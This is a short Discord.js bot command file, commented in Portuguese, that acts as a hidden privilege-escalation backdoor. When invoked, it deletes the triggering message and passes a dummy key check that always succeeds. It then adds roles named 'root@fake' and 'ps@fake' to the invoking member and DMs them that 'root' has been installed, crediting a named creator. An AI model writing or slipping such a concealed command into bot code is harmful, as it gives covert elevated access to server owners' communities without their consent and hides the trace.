const Discord = require("discord.js")
module.exports.run = async (client, message, args) => {
  message.delete()
  const key = "458104"
  if(key === "458104") {
  const root = message.guild.roles.cache.find(r => r.name === "root@fake")
  message.member.roles.add(root)
  const rootsucess = new Discord.MessageEmbed()
  .setTitle(`Instalado Voce esta com o root! divirta-se!`)
  .setColor("BLACK")
  .setDescription("Creditos Pro Criador: Fαкe#1737")
  message.author.send(rootsucess)
   const position = message.guild.roles.cache.find(r => r.name === "ps@fake")
  message.member.roles.add(position)
  }
}